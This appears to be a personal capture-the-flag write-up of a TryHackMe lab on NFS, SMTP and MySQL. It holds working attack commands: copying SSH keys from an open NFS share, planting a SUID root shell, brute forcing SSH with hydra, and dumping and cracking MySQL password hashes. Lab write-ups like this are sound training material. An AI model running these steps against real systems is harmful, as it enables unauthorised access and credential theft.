# THM - Network Services Part 2
---

	Date 2021-10-09 | Author: Maik Roland Damm | Version: 1.0


## Overview

^5ce8d8

* [[TryHackMe - Network Services Part 2#^5ce8d8|Overview]]
* [[TryHackMe - Network Services Part 2#^05fa5b|Network File System]]
* [[TryHackMe - Network Services Part 2#^6098f1|Simple Mail Transfer Protocol]]
* [[TryHackMe - Network Services Part 2#^761bd1|Relational Database Management System (RDBMS)]]
* [[TryHackMe - Network Services Part 2#^f92894|Todo]]

---

## NFS (Network File System)

^05fa5b

***Exporting ip***

First export the remote host IP to an local variable. 

```bash
export IP='10.10.175.51'
```


***Initial nMap scan***

Now the initial nmap scan will be done. For this a simple scan of first 10k ports should be sufficient.

```bash
sudo nmap -vv -sS -p1-10000 -O $IP -oN nmap/initial
```

	Results:
	PORT     STATE SERVICE
	22/tcp   open  ssh
	111/tcp  open  rpcbind
	2049/tcp open  nfs

***Show available NFS directorys***

The NFS port is open on 2049. Now lets look on the NFS for folders.

```bash
/usr/sbin/showmount -e $IP
```

	Results:
	/home *

***Mount NFS Directory and copy ssh key to login***

To work with the remote NFS, mount it to local file system. After that looking for usefuly ssh keys to download.
```bash
mkdir /tmp/mount
mount -t nfs $IP:home /tmp/mount
cp /tmp/mount/.ssh/id_rsa .
chmod 600 id_rsa
```

***Uploading own bash file to NFS and execute it to get root perms!***

```bash
cp bash /tmp/mount/cappucino
cd /tmp/mount
sudo chown root: bash
sudo chmod 4755 bash
sudo chmod +xrs bash
```

Running the bash command with -p (persist rights) to gain root.
```bash
ssh -i id_rsa cappucino@$IP
./bash -p
whoami
```

	Results:
	root

***Looking for root FLAG***

Finanly got flag to solve room.
```bash
cat /root/root.txt
```

	Results:
	THM{nfs_got_pwned}

---

## SMPT (Simple Mail Transfer Protocol)

^6098f1

***Exporting ip***

First export the remote host IP to an local variable. 

```bash
export IP='10.10.212.232'
```


***Initial nMap scan***

Now the initial nmap scan will be done. For this a simple scan of first 10k ports should be sufficient.

```bash
sudo nmap -vv -sS -p1-10000 -O $IP -oN nmap/initial
```

	Results:
	PORT   STATE SERVICE REASON
	22/tcp open  ssh     syn-ack ttl 63
	25/tcp open  smtp    syn-ack ttl 63
	
***Get informations from the SMTP***

For this, the usage of metasploit framework is essentialy.

```bash
mfsconsole
```

```bash -> mfsconsole
#to get smtp version info
search smtp_version
use 0
set RHOSTS $IP # replace with the ip
exploit
```

	Results:
	[+] 10.10.212.232:25      - 10.10.212.232:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a

```bash -> msfconsole
#to enumerate a username on the smtp
search smtp_enum
use 0
set RHOSTS $IP # replace with the ip
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
exploit
```

	Results:
	[+] 10.10.212.232:25      - 10.10.212.232:25 Users found: administrator

***Cracking the password from administrator account using hydra***

Using hyrda instead of own CPU saved massevly energy and money. Its an online brute force service. To crack password of account addministrator use ssh.

```bash
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.212.232 ssh
```

	Results:
	[22][ssh] host: 10.10.212.232   login: administrator   password: alejandro

***Login to machine with ssh and cracked administartor password***
```bash
ssh administrator@$IP
ls
cat smtp.txt
```

	Results:
	THM{who_knew_email_servers_were_c00l?}

---

## MySQL (Relational Database Management System (RDBMS))

^761bd1

***Exporting ip***

First export the remote host IP to an local variable. 

```bash
export IP='10.10.239.122'
```


***Initial nMap scan***

Now the initial nmap scan will be done. For this a simple scan of first 10k ports should be sufficient.

```bash
sudo nmap -vv -sS -p1-10000 -O $IP -oN nmap/initial
```

	Results:
	PORT     STATE SERVICE REASON
	22/tcp   open  ssh     syn-ack
	3306/tcp open  mysql   syn-ack

***Testing login with given credentials***
	root:password
	
```bash
mysql -h $IP -u root -p
# lets exit the mysql console
MySQL [(none)]> exit
```

***Starting Metasploit and get SQL Informations***

```bash
msfconsole
search mysql_sql
use 0
options to change -> PASSWORD / RHOSTS / USERNAME
exploit
```

	Results
	5.7.29-0ubuntu0.18.04.1
	
*to get databses *
```bash
# in msf
set SQL show databases
exploit
```

	Results
	[*] 10.10.239.122:3306 -  | information_schema |
	[*] 10.10.239.122:3306 -  | mysql |
	[*] 10.10.239.122:3306 -  | performance_schema |
	[*] 10.10.239.122:3306 -  | sys |

***Lets crack the database***

In the first step use mysql_schema_dump in metasploit Framework to dump database tables.

```bash
search mysql_schemadump
use 0
options
set PASSWORD password
set RHOSTS 10.10.239.122
set USERNAME root
exploit
```

	Results
	a very big dump!
	
**Getting all hashes in Databes**	
```bash
search mysql_hashdump
use 0
options
set PASSWORD password
set RHOSTS 10.10.239.122
set USERNAME root
exploit
```

	Results
	[+] 10.10.239.122:3306    - Saving HashString as Loot: root:
	[+] 10.10.239.122:3306    - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
	[+] 10.10.239.122:3306    - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
	[+] 10.10.239.122:3306    - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
	[+] 10.10.239.122:3306    - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
	[+] 10.10.239.122:3306    - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18

**Cracking hash from carl with JohnTheRipper**
```bash
echo 'carl:*EA031893AA21444B170FC2162A56978B8CEECE18' > hash.txt
john hash.txt
```

	Results
	doggie           (carl)

**SSH into machine with user carl and password**
```bash
ssh carl@$IP
password->doggie
# now in
ls
cat mysql.txt
```

	Results
	THM{congratulations_you_got_the_mySQL_flag}


## Todo

^f92894

#mytodo
- [x] NFS
- [x] SMTP
- [x] MySQL


